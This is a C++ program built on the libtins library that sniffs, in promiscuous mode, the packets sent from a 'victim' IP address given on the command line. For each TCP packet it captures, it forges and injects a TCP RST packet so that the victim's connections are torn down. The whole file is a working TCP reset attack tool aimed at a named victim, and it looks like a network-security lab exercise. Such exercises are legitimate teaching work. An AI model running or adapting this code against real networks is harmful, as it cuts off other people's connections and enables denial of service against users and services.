#include <iostream>
#include <tins/tins.h>

using namespace Tins;
using namespace std;

string network_interface = "enp0s3";

void send_RST_Pkt(EthernetII::address_type eth_src, EthernetII::address_type eth_dst, 
			 IPv4Address src_addr, IPv4Address dst_addr, uint16_t sport, uint16_t dport,
			 uint32_t seq_num) {
	
	EthernetII eth(eth_src, eth_dst);
	IP *ip = new IP(src_addr, dst_addr);
	TCP *tcp = new TCP(sport, dport);
	tcp->flags(tcp->flags() | TCP::RST);
	tcp->seq(seq_num);

	// tcp is ip's inner pdu
	ip->inner_pdu(tcp);
	
	// ip is eth's inner pdu
	eth.inner_pdu(ip);
	
	// Packet details
	cout << "RST packet:" << endl;
	cout << eth.src_addr() << " -> " << eth.dst_addr() << endl;
	cout << ip->src_addr() << ':' << tcp->sport() << "->" << ip->dst_addr() << ':' << tcp->dport()
		 << " seq: " << tcp->seq() << endl << endl;
		 
	// The actual sender
	PacketSender sender;
	
	// Send the packet through the default interface
	sender.send(eth, network_interface);
}


bool sniff_pkt(const PDU &pdu) {
	// Find the eth layer
	const EthernetII &eth = pdu.rfind_pdu<EthernetII>();
	
	// Find the IP layer
	const IP &ip = pdu.rfind_pdu<IP>(); 
	
	// Find the TCP layer
	const TCP &tcp = pdu.rfind_pdu<TCP>(); 
	
	cout << "sniiffed: " << endl;
	cout << eth.src_addr() << " -> " << eth.dst_addr() << endl;
	cout << ip.src_addr() << ':' << tcp.sport() << "->" << ip.dst_addr() << ':' << tcp.dport()
		 << " seq: " << tcp.seq() << " ack: " << tcp.ack_seq() << endl << endl;
		
	send_RST_Pkt(eth.src_addr(), eth.dst_addr(), ip.src_addr(), ip.dst_addr(), tcp.sport(), tcp.dport(), tcp.ack_seq());
	
	return true;
}

void do_sniffing(IPv4Address victim) {
	string filter = "ip src " + victim.to_string();
	
	// Setting up sniffer configuration
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	config.set_immediate_mode(true);
	config.set_filter(filter);
	
	// Setting up the sniffer
	Sniffer sniffer(network_interface, config);
	sniffer.sniff_loop(sniff_pkt);
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		cout << "Usage: " <<* argv << " <Victim>" << endl;
		return 1;
	}
	
	IPv4Address victim;
    try {
        // Convert dotted-notation ip addresses to integer. 
        victim = argv[1];
    } catch (...) {
        cout << "Invalid ip found...\n";
        return 2;
    }
    
    
    try {
        do_sniffing(victim);
    } catch (runtime_error& ex) {
   	    cout << "Runtime error: " << ex.what() << endl;
        return 7;
    }
}
